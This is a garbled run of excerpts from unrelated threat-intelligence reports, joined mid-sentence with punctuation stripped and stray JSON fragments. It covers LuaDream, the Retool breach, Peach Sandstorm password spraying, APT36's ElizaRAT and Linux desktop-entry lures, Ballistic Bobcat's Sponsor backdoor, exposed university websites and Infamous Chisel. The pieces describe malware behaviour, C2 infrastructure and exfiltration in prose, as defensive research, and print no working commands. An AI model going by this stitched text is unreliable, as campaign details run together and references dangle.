in LuaDream stagingAlthough the DLL timestamps could have been manipulated by the threat actor given the proximity to the August 2023 intrusion date it is likely that the timestamps are authentic Due to the difference of only a few days between the timestamps of ualapidll and commondll and their actual deployment dates it is possible that these images have been built specifically for this intrusionSome of the implemented anti-analysis measures include hiding LuaDreams threads from a debugger using the NtSetInformationThread function file close operation on an invalid handle 0x123456 detection of Wine-based sandboxes and in-memory mapping of malicious PE images to evade EDR API hooks and file-based detectionsNext-stage code is typically packed using a combination of XOR-based encryption and compression The faxdat faxApplication and faxmodule files store packed staging code The code unpacked from faxApplication contains a LuaJIT engine enabling the execution of the LuaJIT components internally referred to as interface and crt as well as LuaDream itselfinterface unpacks crt from faxmodule which in turn retrieves XML-formatted configuration and the contents of the faxcache file an encrypted and compressed Lua function which returns the reference names and implementations of LuaDream components in Base-64 encoded formThe LuaDream configuration includes C2 and communication protocol information The LuaDream variant we analyzed is configured to communicate with the modeencagilcom domain over the WebSocket protocolLuaDream is a multi-component and multi-protocol backdoor whose main features are managing attacker-provided plugins and exfiltrating system and user information The implementation and architecture of LuaDream indicates that it is a maintained actively developed project of a considerable scaleThroughout our analysis we observed what is likely a malware version string 120252329 which the backdoor sends to the C2 server when exfiltrating information Many LuaDream function and variable definitions follow a naming convention involving the word fun such as dofun RUNFUNLIST and FunGetDataCacheLuaDream implements testing functions as well as error and execution status logging which indicates that the malware is likely still in active development A string artifact in a function labeled comTestJson suggests potential development in June 2022Testing functions decompiled LuaJIT bytecodeWe observed the embedded private IP address 10210199 to which LuaDream binds the communication port 4443 if so configured This address does not belong to the IP address spaces of the targeted environments The IP address may be a leftover from an in-development LuaDream variant or from a previous Sandman engagementThe core components implement LuaDream features such as initialization gathering system and user information C2 communication and plugin management As per the component definitions from the faxcache file the core LuaDream components are structured into two categories com and mainWith the main component initializing LuaDream the backdoor connects to the configured C2 server and exfiltrates system user and malware-related information gathered by BGetSystemMsg This information includes the malware version assigned IP and MAC addresses OS version available memory and the name PID and username associated with the process in whose context LuaDream runsLuaDream has the capability to reach out to C2 servers but also to act as an implant listening for incoming connections The backdoor can communicate over the TCP HTTPS WebSocket and QUIC protocols The mainprotoXTcpClient mainprotoWinHttpClient mainprotoXWebSocketClient and mainprotoXQuicClient components implement support for these protocols with mainzprotoInterface acting as their main handlerThe mainprotoAQueryDns component resolves domains to IP addresses using the cloudflare-dnscom service which mainprotoXWebSocketClient uses for resolving C2 domain namesmainprotoXQuicClient draws functionalities from a DLL image which LuaDream maps fully in memory a functionality implemented by the AcomLoadDLL componentLuaDream communicates with a C2 server using the threadconnect threadsend and threadrecv components which are responsible for connecting to sending data to and receiving data from the C2 server respectively These components operate in separate threads The exchanged data is in JSON and XML format in an encrypted and compressed form The Acomdefine component provides functionalities for inter-thread communication and data manipulationThe threadrecv component handles incoming messages and its main purpose is to manage attacker-provided plugins that extend LuaDream Some functionalities of this component includeLuaDream maintains a key-based list of plugin information which includes the handle and the ID of the thread in which the plugin runs and a plugin-identifying key Loading of a plugin involves inserting a new entry in this list and executing plugin code in a designated thread For communicating with plugins LuaDream leverages inter-thread communication using the message 1234 for executing plugin functionalitiesOur analysis of LuaDream staging samples shared on VirusTotal revealed the existence of two additional components named mainprotoWinHttpServer and threadtest mainprotoWinHttpServer implements a LuaDream capability to listen for incoming connections based on the Windows HTTP server API threadtest implements functions for testing the loadplugin and saveplugin commands These functions indicate the existence of a plugin named cmd whose name suggests command execution capabilitiesThe LuaDream samples we analyzed communicate with the C2 servers sslexplorecellcom and modeencagilcom sslexplorecellcom is a Tucows-registered domain with a first-seen resolution date of March 2023 This domain last resolved to

build business software by companies ranging from startups to Fortune 500 enterprises including Amazon Mercedes-Benz DoorDash NBC Stripe and LyftSnir Kodesh Retool's head of engineering revealed that all hijacked accounts belong to customers in the cryptocurrency industryThe breach occurred on August 27 after the attackers bypassed multiple security controls using SMS phishing and social engineering to compromise an IT employee's Okta accountThe attack used a URL impersonating Retool's internal identity portal and was launched during a previously announced migration of logins to OktaWhile most of the targeted employees ignored the phishing text message one clicked the embedded phishing link that redirected to a fake login portal with a multi-factor authentication MFA formAfter signing in the attacker deepfaked an employee's voice and called the targeted IT team member tricking them into providing an additional MFA code which allowed the addition of an attacker-controlled device to the targeted employee's Okta accountRetool is blaming the success of the hack on a new feature in Google Authenticator that allows users to synchronize their 2FA codes with their Google accountThis has been a long-requested feature as you can now use your Google Authenticator 2FA codes on multiple devices as long as they are all logged into the same accountHowever Retool says that the feature is also to blame for the August breach severity as it allowed the hacker who successfully phished an employee's Google account access to all their 2FA codes used for internal servicesThis allowed them to run an account takeover attack on a specific set of customers all in the crypto industry They changed emails for users and reset passwords After taking over their accounts the attacker poked around some of the Retool appsAs Kodesh explained while initially Retool had enabled MFA the auth codes synced by Google Authenticator to the cloud led to an inadvertent transition to single-factor authenticationThis shift occurred as control over the Okta account translated into control over the Google account granting access to all One-Time Passwords OTPs stored within Google AuthenticatorWe strongly believe that Google should either eliminate their dark patterns in Google Authenticator which encourages the saving of MFA codes in the cloud or at least provide organizations with the ability to disable itWhile Google Authenticator does promote its cloud sync feature it is not required If you have enabled the feature you can deactivate it by clicking on the account circle at the top right of the app and selecting 'Use Authenticator without an account' This will log you out of the app and delete your synchronized 2FA codes in your Google accountOur first priority is the safety and security of all online users whether consumer or enterprise and this event is another example of why we remain dedicated to improving our authentication technologies Beyond this we also continue to encourage the move toward safer authentication technologies as a whole such as passkeys which are phishing resistant a Google spokesperson told BleepingComputerGoogle also recommended migrating to FIDO-based tech from legacy one-time password OTP multi-factor authentication as a simple way to thwart similar attacksPhishing and social engineering risks with legacy authentication technologies like ones based on OTP are why the industry is heavily investing in these FIDO-based technologies the Google spokesperson saidWhile we continue to work toward these changes we want to ensure Google Authenticator users know they have a choice whether to sync their OTPs to their Google Account or to keep them stored only locally In the meantime we'll continue to work on balancing security with usability as we consider future improvements to Google AuthenticatorAfter discovering the security incident Retool revoked all internal employee authenticated sessions including those for Okta and G SuiteIt also restricted access to all 27 compromised accounts and notified all affected cloud customers restoring all hijacked accounts to their original configurations no on-premise customers were impacted in the incident according to RetoolThis meant that although an attacker had access to Retool cloud there was nothing they could do to affect on-premise customers Kodesh saidIt's worth noting that the vast majority of our crypto and larger customers in particular use Retool on-premiseRetool's development platform is used to build business software by companies ranging from startups to Fortune 500 enterprises including Amazon Mercedes-Benz DoorDash NBC Stripe and LyftThreat actors increasingly use social engineering attacks targeting IT service desks or

        "text": "Since February 2023 Microsoft has observed password spray activity against thousands of organizations carried out by an actor we track as Peach Sandstorm HOLMIUM Peach Sandstorm is an Iranian nation-state threat actor who has recently pursued organizations in the satellite defense and pharmaceutical sectors around the globe Based upon the profile of victim organizations targeted and the observed follow-on intrusion activity Microsoft assesses that this initial access campaign is likely used to facilitate intelligence collection in support of Iranian state interestsIn cases where Peach Sandstorm successfully authenticated to an account Microsoft observed the group using a combination of publicly available and custom tools for discovery persistence and lateral movement In a small number of intrusions Peach Sandstorm was observed exfiltrating data from the compromised environmentGiven the volume of activity ongoing attempts to access targets of interest and risks associated with post-compromise activity Microsoft is reporting on this campaign to raise awareness of recent Peach Sandstorm tradecraft and empower organizations to harden their attack surfaces and defend against this activity As with any observed nation state actor activity Microsoft directly notifies customers that have been targeted or compromised by Peach Sandstorm and provides them with the information they need to secure their accountsThroughout 2023 Peach Sandstorm has consistently demonstrated interest in organizations in the satellite defense and to a lesser extent pharmaceutical sectors In the initial phase of this campaign Peach Sandstorm conducted password spray campaigns against thousands of organizations across several sectors and geographies While Microsoft observed several organizations previously targeted by Peach Sandstorm the volume of activity and range of organizations suggests that at least a subset of the initial activity is opportunisticUnlike password spray operations which are noisy by definition a subset of Peach Sandstorms 2023 post-compromise activity has been stealthy and sophisticated Many of the cloud-based tactics techniques and procedures TTPs seen in these most recent campaigns are materially more sophisticated than capabilities used by Peach Sandstorm in the pastMicrosoft observed Peach Sandstorm using two distinct sets of TTPsin the early stages of the intrusion lifecycle in 2023 attacks In later stages of known compromises the threat actor used different combinations from a set of known TTPs to drop additional tools move laterally and ultimately exfiltrate data from a targetPassword spray activityBetween February and July 2023 Peach Sandstorm carried out a wave of password spray attacks attempting to authenticate to thousands of environments Password spraying is a technique where threat actors attempt to authenticate to many different accounts using a single password or a list of commonly-used passwords Unlike brute force attacks that target a single account using many passwords password spray attacks help adversaries maximize their chances for success and minimize the likelihood of automatic account lockoutsEven a single compromised account could allow an adversary to conduct reconnaissance move laterally or access sensitive resources often without attracting attention from defendersLong-running password spray campaigns offer insight into adversaries pattern of life Activity observed in this campaign aligned with an Iranian pattern of life particularly in late May and June where activity occurred almost exclusively between 900 AM and 500 PM Iran Standard Time IRST While Peach Sandstorm has carried out high-volume password spray campaigns in the past elements of the most recent campaign were unique Specifically Peach Sandstorm consistently conducted the password sprays from TOR IPs and used a go-http-client user agentInternal reconnaissance with AzureHound or RoadtoolsAzureHound and Roadtools have functionality that is used by defenders red teams and adversaries The same features that make these tools useful to legitimate users like pre-built capabilities to explore and seamlessly dump data in a single database also make these tools attractive options for adversaries seeking information about or from a targets environmentMultiple persistence mechanismsIn cases where Microsoft observed this particular intrusion chain the threat actor used one or more persistence mechanisms In some cases Peach Sandstorm created a new Azure subscription on a targets tenant andor leveraged previously compromised Azure resources These subscriptions were subsequently used to facilitate communication with Peach Sandstorms infrastructureInitial access using remote exploitationIn this wave of activity Peach Sandstorm also attempted to exploit vulnerabilities with a public proof-of-concept POC in Zoho ManageEngine or Confluence to access targets environmentsThe following post-compromise activity affected organizations in the defense satellite and pharmaceutical sectorsAs Peach Sandstorm increasingly develops and uses new capabilities organizations must develop corresponding defenses to harden their attack surfaces and raise costs for these attacks Microsoft will continue to monitor Peach Sandstorm activity and implement robust protections for our customersTo harden an attack surface against Peach Sandstorm activity defenders can implement the followingSecuring critical assets like AD FS servers is a high-value measure to protect against golden SAML attacks The guidance provided below is applicable beyond just Peach Sandstorm activity and can help organizations harden their attack surfaces against a range of

MainAsync Inside this task all important malicious operations are carried outThe image below shows ProgramMain kick starting the malicious activities on the endpointFigure 1 The MainAsync method used to start the malicious activities on the endpointSome of the key operations performed by ElizaRAT areIn the following sections we dive deeper into some of these operationsLogging OperationEach execution result is logged on both the endpoint client-side and the Telegram bot server-sideThe code below shows that logging is done at the local and remote levelUnique Identifier GenerationA UUID and username are generated for each infected machine so that the threat actor can uniquely identify the victim It uses Windows Management Instrumentation WMI to fetch the processorID and UUID of the machine and uses both these details to generate a UUID and username specific to the infected machineThe only difference between the generated UUID and the username is the cookie extension The username is the UUID without the cookie extensionThe image below shows the relevant code used to generate these valuesFigure 2The getusername method used to generate the UUID and username to identify the infected machineC2 Command FormatSince the threat actor uses the same Telegram bot to manage multiple infected endpoints they use a specific C2 command format to synchronize the operations and ensure that a given command executes only on the intended endpointThe C2 command format looks like thiscommandusernameargumentsC2 CommandsAll C2 commands are handled in a switch-case statement by the BotOnMessage method inside the Communicate class Before the execution of any command the RAT extracts the username from the C2 command and compares it with the infected machine's username The command is executed successfully only if both the values matchThe following C2 commands are supported by the botPersistenceIn order to achieve persistence on the infected machine the bot creates a Windows shortcut file LNK in the Windows Startup directoryThe image below shows the code used to create this shortcut file The name of the shortcut file is fetched from the origname setting defined in the config In this case the shortcut file is called TextSourcelnkFigure 3 The buildforts method used to create a Windows shortcut file in the Startup directory for persistenceThe description of this shortcut file is set to Text Editing APP for Windows to disguise it as a text editing application making it seem innocuous In addition the target command line is set to execute the Control panel applet using rundll32Displaying Decoy ContentThe method dosome defined in the Program class is responsible for displaying the decoy PDF file to the user This decoy file is present inside the resources section of the NET binaryThe image below shows the decoy file It is only used to distract the victim and make it appear that an error occurred when opening the fileFigure 4 Decoy PDF file displayed to the userThe utilization of Linux desktop entry files by APT36 as an attack vector has never been documented before This attack vector is fairly new and appears to be utilized in very low-volume attacks So far our research team has discovered three samples -

May 2023In May 2023 we discovered a credential phishing site email9ovin targeting Indian government officials by masquerading as the official login portal for National Informatics Center NIC India We notified NIC in May 2023 about this website and the associated threat intel We also noticed that the same phishing website was using the hxxpsemail9ovinVISITOFMEDICAL URL to redirect visitors to the hxxp1032232828081Tri-Service-ExerciseDelegationSaudiArabiazip URLFrom here a visitor would download a ZIP archive containing a maliciously crafted Linux desktop entry fileHere are some technical details about this caseDesktop entry file analysisWe found the following content in the desktop entry fileThe icon of this desktop entry file is set to x-office-document to seem like an innocent Office documentThe base64-encoded command present inside the desktop entry file decodes toThe command decoded above performs the following actions1 Downloads the decoy PDF and saves it in the tmp directory with the filename DelegationSaudiArabiapdf 2 Downloads the Linux payload and saves it in the tmp directory with the filename 185elf 3 Marks the Linux binary as executable4 Uses LibreOffice to open and display the decoy PDF file5 Executes the Linux payloadIn this case the Linux payload was a cross-platform binary designed to run on both Linux and WSL Windows Subsystem for Linux machines Since it did not contain a fully functional C2 mechanism at the time of analysis we believe it was still in a development phase and used by the threat actor as an initial testThe content inside the decoy PDF file is displayed in the image below Figure 5 Decoy PDF displayed to the userThe PDF appears to be a document from the Indian Ministry of Defence describing the visit of nine members of a delegation from Saudi Arabia where they discussed issues with Indian Armed Forces medical officialsInflated File Attack - June 2023Beginning in June 2023 we detected APT36 establishing their operational infrastructure on a server with the IP address 1539222059 The threat actor proceeded to register multiple domains hosted on this IP Further insight into this attacker-controlled infrastructure is available in the Threat Actor Infrastructure sectionIn August we noted a significant development where few of these domains served as the hosting platform for decoy PDF files These PDFs were linked within the malicious Linux desktop entry files which the threat actor distributed enclosed in zip archivesHere are some technical details about this caseDesktop entry file analysisThe first anomaly we observed was the large size of the Linux desktop entry file A size larger than 1 MB for a Linux desktop entry file is rare Reviewing the file revealed that the threat actor inflated the size of the file by adding more than a million characters We believe this was an attempt by the threat actor to bypass security scanning solutionsThe image below shows the extra characters added to the inflated Linux desktop entry fileFigure 6 The inflated Linux desktop entry fileThe relevant content from the Linux desktop entry file is shown belowThis desktop file performs these main operationsFigure 7 The icon of the desktop configuration file is set to PDF to make it more convincingAt the time of our analysis the server 64227133222 was not serving the Linux payload We continued monitoring this infrastructure and noticed that on Aug 29 2023 a new domain called admin-brin was registered and used to distribute a new Linux desktop entry file In this instance we were able to retrieve the payloads and conclude the threat attribution to APT36Here is metadata from the new Linux desktop entry fileThe relevant content from the Linux desktop entry file is shown belowThe functionality of this file is similar to the previous Linux desktop entry fileThe image below shows a decoy PDF file displaying an error message stating Failed to load the PDF document This is used to distract the user while malicious activities occur in the backgroundFigure 8 The decoy PDF file displayed to the userIn this case the Linux desktop entry file retrieves the malicious Linux payloads from the servers atThe two files retrieved are cleverly named to disguise themselves as legitimate software utilitiesHere is the metadata of Linux payloadsThe corresponding C2 servers extracted from each malicious Linux payload are listed belowThe C2 panel for Mythic Poseidon can be accessed by visiting the URI path newlogin on the server running at port 7443For instance the C2 panel for 10861163195 can be accessed at hxxps108611631957443newlogin Figure 9 The Mythic C2 panel for the Poseidon binaryDuring our analysis we also discovered new Python-based ELF binaries used by APT36 for the purpose of cyber espionage These binaries target the Linux environment in the Indian government organizations and are named to seem like legitimate Linux system servicesIn this section we review two types of cyber espionage tools discovered by our research teamGLOBSHELL - Custom-built File exfiltration Linux utilityThe espionage tool under analysis includes this metadataThis ELF binary was compiled using PyInstaller We extracted the decompiled Python code to understand its functionality The image below shows the decompiled codeFigure 10 The decompiled code of Python-based cyber espionage tool type 1These are the key operations performed by this scriptWe found another ELF binary called mm-precpu-wq with the same functionality as the ELF binary discussed above However this binary included a more in-depth predefined list of file extensions and file paths which it scans to exfiltrate files In addition to the media directory this binary also searches the following pathsPYSHELLFOX - Custom-built Firefox session stealing Linux utilityThe second type of cyber espionage tool we discovered steals the Firefox browser session details of the user if the user has a browser tab open with any of the following titles or URLsAs is evident from this list the threat actor is interested in exfiltrating the user's Indian government inbox details as well as WhatsApp conversationsThe image below shows the relevant code section which does thisFigure 11 The decompiled code Python-based cyber espionage tool type 2The espionage tool under analysis includes this metadataThese are the key operations performed by this scriptWhy is APT36 suddenly adding new attack vectors for the Linux environmentWe attribute these new Windows and Linux-based attacks to APT36 because their method of serving decoy PDF files the metadata and their Linux commands are almost identical to previous attacks which are known and linked to APT36 In addition to this there is also a C2 infrastructure overlap with previous APT36 attacks which we describe in more detail in the corresponding sectionDecoy PDF filesThe decoy PDF file which is dropped in the same directory as the malicious DLL on the victim's machine by ElizaRAT The metadata of this PDF file indicated the author as Apolo Jones and the PDF file itself was generated with Microsoft Office WordIn addition to this the decoy PDF files downloaded from the attacker-controlled servers in the campaign targeting the Linux platform share the same metadata as wellLinux commandsWhile the attack vector used to distribute the Linux payload is entirely new in this campaign the Linux commands and file paths used in the desktop entry files share similarities with the previous APT36 campaign used to distribute Linux payloadsBy comparing the Linux commands used in the decompiled Python code in March 2023 and the Linux commands used in the latest desktop entry files in August 2023 we can see a clear similarityThe figure below shows a side-by-side comparison of the twoFigure 12 A side-by-side comparison of Linux commands from the March 2023 and August 2023 campaigns executed by APT36Here is a list of similarities between both casesIn the APT36 attacks observed since April 2023 the threat actor has taken extensive measures to conceal any connection to Pakistan by making it seem that the infrastructure is controlled by a threat actor in India We assess with a high-confidence that this is not a coincidence but rather an intentional deception tactic used by APT36 to avoid the attacks from being attributed to PakistanRegistrant Country of C2 DomainsBeginning in June 2023 the threat actor started registering several domains on a server with the IP address 1539222059 The IP address is related to the Hostinger ASN This infrastructure was involved in the attacks distributing malicious Linux desktop entry files discussed earlierWhile the WHOIS information for all these domains is redacted we can still see the registrant country For most of the domains the threat actor took sufficient measures to ensure the registrant country is India IN However for one of the domains admindeskin we can see the registrant country is PK PakistanThe figure below shows examples of WHOIS information for two of the domains registered by the threat actor on the same infrastructure and used in the same attackFigure 13 A side-by-side comparison of the WHOIS info from two attacker-registered domains related to same campaign and infrastructureWe believe this was an OPSEC mistake by the threat actorC2 Infrastructure OverlapThere is a C2 infrastructure overlap between the latest campaign and the previous instances of attacks by APT36Email Associated with Malicious Google Drive LinksElizaRAT is distributed using malicious Google Drive links Leveraging the Google Drive ID from the links we gathered additional information about the owner of the Google Drive and the corresponding email address The image below shows the information we retrievedFigure 14 A Google Drive link details revealing owner informationThe email address and owner name associated with the Google Drive link wasBecause Nand Kishore is a common name in India the fake owner was added to implicate a threat actor from India not Pakistan - where APT36 originatesAttacker-Controlled Server IP AddressesIn a few instances threat actors distributed malicious Linux desktop entry files where the embedded payloads were hosted on servers located in India This tactic of using servers in the same region as the targeted country for mounting attacks is another deceptive technique employed by APT36Here is a list of the IP addresses of four servers hosting the malicious Linux payloadsIn all of the attacks we reviewed for this blog the TLD was always set to in - corresponding with the country of India Another tactic used by APT36 in a few cases is to disguise bad URLs as official Indian government-related web addressesOur research team is actively monitoring the C2 infrastructure of APT36 which is used to register new domains that are used in attacks targeting the Linux environment The infrastructure continues to be active at the time of this blog publication We have included a comprehensive list of indicators of compromise IOCs at the end of this blog and we urge the research community to update their detection We have also done a proactive responsible disclosure to the National Informatics Centre NIC India with IOC details and the associated threat intelligenceAPT36s introduction of new file formats new attack vectors and a new backdoor to the arsenal suggests that they are actively updating their tactics techniques and procedures TTPs In addition to staying on top of these threats Zscaler's ThreatLabz team continuously monitors for new threats and shares its findings with the wider communityZscaler's multilayered cloud security platform detects indicators at various levelsWindows PlatformLinux PlatformAttacker InfrastructureThe domains and URLs below are involved in the attacks used to target Linux environments with desktop entry files Notice how all of them are using in as the TLDThe domains and URLs below are related to the Python-based cyber espionage toolsThe URLs used to host the password-protected archive files distributing ElizaRATLearn aboutZscaler is universally recognized as the leader in zero trust Leveraging the largest security cloud on the planet Zscaler anticipates secures and simplifies the experience of doing business for the world's most established companiesAll rights reserved Zscaler and other trademarks listed at zscalercomlegaltrademarks are either i registered trademarks or service marks or ii trademarks or service marks of Zscaler Inc in the United States andor other countries Any other trademarks are the properties of their respective owners"

Sponsoring Access campaign which utilizes an undocumented Ballistic Bobcat backdoor we have named Sponsor11 Sep 2023 18 min readESET researchers discovered a Ballistic Bobcat campaign targeting various entities in Brazil Israel and the United Arab Emirates using a novel backdoor we have named Sponsor We discovered Sponsor after we analyzed an interesting sample we detected on a victims system in Israel in May 2022 and scoped the victim-set by country Upon examination it became evident to us that the sample was a novel backdoor deployed by the Ballistic Bobcat APT groupOverlaps between Ballistic Bobcat campaignsand Sponsor backdoor versions show a fairly clear pattern of tool development and deployment with narrowly targeted campaigns each of limited duration We subsequently discovered four other versions of the Sponsor backdoor In total we saw Sponsor deployed to at least 34 victims in Brazil Israel and the United Arab Emirates as outlined in Figure 1Key points of this blogpostBallistic Bobcat obtained initial access by exploiting known vulnerabilities in internet-exposed Microsoft Exchange servers by first conducting meticulous scans of the system or network to identify potential weaknesses or vulnerabilities and subsequently targeting and exploiting those identified weaknesses The group has been known to engage in this behavior for some time However many of the 34 victims identified in ESET telemetry might best be described as victims of opportunity rather than preselected and researched victims as we suspect Ballistic Bobcat engaged in the above-described scan-and-exploit behavior because it was not the only threat actor with access to these systems We have named this Ballistic Bobcat activity utilizing the Sponsor backdoor the Sponsoring Access campaignThe Sponsor backdoor uses configuration files on disk dropped by batch files and both are innocuous so as to bypass scanning engines This modular approach is one that Ballistic Bobcat has used quite often and with modest success in the past two and a half years On compromised systems Ballistic Bobcat also continues to use a variety of open-source tools which we describe together with the Sponsor backdoor in this blogpostA significant majority of the 34 victims were located in Israel with only two located in other countriesTable 1 describes the verticals and

pushed their newest backdoor Sponsor This would turn out to be the third version of the backdoorFor 16 of the 34 victims it appears Ballistic Bobcat was not the only threat actor with access to their systems This may indicate along with the wide variety of victims and the apparent lack of obvious intelligence value of a few victims that Ballistic Bobcat engaged in scan-and-exploit behavior as opposed to a targeted campaign against preselected victimsBallistic Bobcat employed a number of open-source tools during the Sponsoring Access campaign Those tools and their functions are listed in Table 2FilenameDescriptionhost2ipexeCSRSSEXEmiexegostexechiselexecsrssprotectedexeplinkexeWebBrowserPassViewexesqlextractorexeprocdump64exeBallistic Bobcat deployed batch files to victims systems moments before deploying the Sponsor backdoor File paths we are aware of areUnfortunately we were unable to obtain any of these batch files However we believe they write innocuous configuration files to disk which the Sponsor backdoor requires to function fully These configuration filenames were taken from the Sponsor backdoors but were never collectedWe believe that the batch files and configuration files are part of the modular development process that Ballistic Bobcat has favored over the past few yearsSponsor backdoors are written in C with compilation timestamps and Program Database PDB paths as shown in Table 3 A note on version numbers the column Version represents the version that we track internally based on the linear progression of Sponsor backdoors where changes are made from one version to the next The Internal version column contains the version numbers observed in each Sponsor backdoor and are included for ease of comparison when examining these and other

execution of Sponsor requires the runtime argument install without which Sponsor gracefully exits likely a simple anti-emulationanti-sandbox technique If passed that argument Sponsor creates a service called SystemNetwork in v1 and Update in all the other versions It sets the services Startup Type to Automatic and sets it to run its own Sponsor process and grants it full access It then starts the serviceSponsor now running as a service attempts to open the aforementioned configuration files previously placed on disk It looks for configtxt and nodetxt both in the current working directory If the first is missing Sponsor sets the service to Stopped and gracefully exitsSponsors configuration stored in configtxt contains two fieldsThe CC servers are stored encrypted RC4 and the decryption key is present in the first line of configtxt Each of the fields including the decryption key have the format shown in Figure 3These subfields areFigure 4 shows an example with color-coded contents of a possible configtxt file Note that this is not an actual file we observed but a fabricated exampleThe last two fields in configtxt are encrypted with RC4 using the string representation of the SHA-256 hash of the specified decryption key as the key to encrypt the data We see that the encrypted bytes are stored hex-encoded as ASCII textSponsor gathers information about the host on which it is running reports all of the gathered information to the CC server and receives a node ID which is written to nodetxt Table 4lists keys and values in the Windows registry that Sponsor uses to get the

with the MD5 algorithm not SHA-256 as previously mentioned This is the case for all communications where Sponsor has to send encrypted dataThe CC server replies with a number used to identify the victimized computer in later communications which is written to nodetxt Note that the CC server is randomly chosen from the list when the r message is sent and the same server is used in all subsequent communicationsSponsor requests commands in a loop sleeping according to the interval defined in configtxt The steps areThe c message is sent to request a command to execute and has the

group also utilized multiple IPs to store and deliver support tools during the Sponsoring Access campaign We have confirmed that none of these IPs are in operation at this timeBallistic Bobcat continues to operate on a scan-and-exploit model looking for targets of opportunity with unpatched vulnerabilities in internet-exposed Microsoft Exchange servers The group continues to use a diverse

        "text": "Many universities worldwide including some of the most prestigious leave their webpages unpatched leaking sensitive information and even open to full takeovers a Cybernews Research team investigation reveals Among the 20 cases found at least six websites belong to the top 100 universities list worldwideThe Cybernews Research team scrutinized 20 websites with millions of monthly visitors in more detail An investigation into indexed information from internet-connected devices provided a list of universities with compromised website security Researchers were able to confirm the entries were accurateSeeing many websites left vulnerable was unexpected as attacks against universities have historically been very common starting from DDoS attacks launched by students trying to cancel classes to full-blown ransomware attacks Cybernews researchers saidAll of the investigated university websites had more than a million monthly visitors according to Similarweb Six universities were ranked in the Top 100 list and 13 were in the Top 1000 listThe level of security wasnt necessarily linked to the universitys size or significance as both small and large universities displayed similar vulnerabilities While the findings didnt include any unprotected databases or vulnerabilities more than a year old some universities were late to apply security updates Researchers also found several critical vulnerabilities and very sensitive credentials being leakedIn the case of the following five universities leaked information could have allowed a complete website takeoverIn the case of 12 universities including those mentioned above it wouldve been possible to obtain private student and teacher information using leaked credentials or exploiting vulnerabilities such as Remote Code Execution which are some of the most dangerous attacksThe last eight universities had other less significant vulnerabilities such as leaving access to source code with full or partial credentialsIts important to note the scope of the research was not exhaustive meaning that the vulnerabilities and misconfigurations that we found are relatively easy to find for unskilled attackers and just as easy to exploit For a more detailed analysis a deeper penetration testing would be required Cybernews researchers notedThe vulnerabilities identified throughout the research were addressed before the publication of this articleVulnerabilities that could allow a takeover of a website were either due to exposed environment files env or remote code execution RCE vulnerabilitiesThree universities had very sensitive information leakingThe University of California San Diego UCSD is a public land-grant research university founded in 1960 It currently enrolls 43000 and 27 alumni have received Nobel Prizes Yet the website of UCSD left database credentials Cloudflare credentials WordPress credentials and email credentials up for grabs Attackers could use these for a website takeover redirects to malicious servers phishing from an official communication channel and accessing user informationSimilarly the website of National Taiwan University NTU a public research institution with 33000 students was leaking JSON Web Token secrets database credentials and a git URL with a username All this could enable attackers to hijack accounts and have admin accessThe Latin American Technology University Online UTEL website was leaking JSON Web Token secrets Google Cloud secrets credentials hosts for multiple databases and Git URL without credentials That could allow arbitrary admin account creation and access to files and personal information UTEL is a private Mexican university for online education founded in 2008Environment files should not be left accessible to outsiders as those are configuration files often containing credentials for some or all third party services databases and APIs used by a web application A malicious actor could use exposed credentials to access private databases and abuse API functions As discovered in some cases the leaked credentials could lead to a full website compromiseDevelopers should make sure that their environment files are not publicly accessible reset leaked credentials and consider starting to monitor for such leaks in the future Cybernews researchers warnAlso compromised credentials for Git repository configuration files which allow attackers to download and inspect the websites source code should be resetRCE vulnerabilities such as WSO2 Web server RCE vulnerability CVE-2022-29464 and Microsoft Exchange RCE vulnerability CVE-2023-21529 are documented and require manual or automatic patching or updating of the Microsoft Exchange serverWalden University and The University of West Indies were running vulnerable WSO2 web server versions patched on 2022-04-25 meaning that these servers were not updated in over a year Cybernews researchers writeOther universities such as Vanderbilt New Hampshire and Old Dominion were more than a month late to patch their Microsoft Exchange servers from the RCE vulnerabilityIn regards to leaked credentials two universities used default credentials for a given software package and five used weak guessable passwords This reflects poor security practices and hints that credentials used for other applications may also suffer from the same weak password policiesCybernews contacted all universities mentioned in the research Portland State University resolved the issue when it was reportedIn our case the discovered issue was an inconsequential information disclosure of file modification metadata for public files There is no foreseeable negative impact for the specific instance of the issue in question The underlying cause was a difference between how our application is deployed and in how our repository of static assets shared across sites are deployed in the case of application deployment multiple other controls are in place preventing this type of information disclosure the university commentedThe University of Pittsburgh responded with a comment which reads Ensuring data security is of utmost importance to the university and we thank you for bringing this matter to our attention Our information security team took immediate steps to correct this vulnerability upon being notified on April 25thDue to the sensitive nature of our cybersecurity precautions the university was otherwise unable to provide further commentOld Dominion University ODU learned of a vulnerability upon the release of a patch when the first public disclosure was made in February The vulnerability was not being exploited at the time To apply the patch ODU followed its standard risk-based approach designed to manage all operational risks including those posed by the vulnerability ODU writes in a statementWalden Universitys answer was as followsWalden University can confirm that we have not had any data leaks or exposure We have a robust monitoring system committed to protecting the privacy and security information of our students and staff regularly conducting software updates and scans for potential vulnerabilities to ensure that there are no exposures If and when false positive vulnerabilities arise due to decommissioned devices we work closely with our partners to release patches that address them Additionally Walden deploys monthly patches to all of the machines within our environment and the organization undergoes an annual external penetration test to validate our configurations and cyber security

Dropbear function modificationsnetd is designed to persist on the system by replacing the legitimate netd system binary at the path systembinnetd This replacement is not carried out by the malware but it can be extrapolated from the checks that it carries out This is the only Infamous Chisel component which persistsWhen the malicious netd is executed it will check if init is the parent process which executed it This parent process is responsible for creating the processes listed in the script initrc The malicious replacement netd when executed in this way will fork and execute the legitimate process backed up at the pathsystembinnetdpassing through the command line parameters This retains the normal functionality of netd while allowing the malicious netd to execute as root This replacement would require an escalated privilege level to performIf it doesnt find itself at the systembinnetd path it will fork and set its parent process ID to 1 also attempting to kill the legitimate netd processThe netd component of Infamous Chisel provides the bulk of the custom functionality which the actor deploys The main purpose of netd is to collate and exfiltrate information from the compromised device at set intervals It uses a combination of shell scripts and commands to collect device information It also searches multiple directories to which files matching a predefined set of extensions are exfiltratedAll file exfiltration is performed as detailed in the Communications File exfiltrationSection of this report Whenever a file is selected for exfiltration it is MD5-hashed and cross-referenced with a list of previously sent file hashes held in a file at one of three locations supporting different Android versions The first existing directory path will be usedThe file exfiltration is considered complete when the server sends Success anywhere in its response As this exfiltration uses a Hypertext Transfer Protocol HTTP POST this server response is also expected to be HTTP but this is not explicitly checked forThe 16 raw bytes of the MD5 are appended to the end of the googleindex file ensuring that the same file isnt sent multiple times As the googleindex file contains raw bytes without prior knowledge it would appear to contain random data The initial allocation size is 256 Kb filled with NULLs providing space for up to a maximum of 16384 file hashes All hash entries will be checked for every file prior to exfiltrationWhen the end of the googleindex file is reached the position is reset to the start overwriting the previous 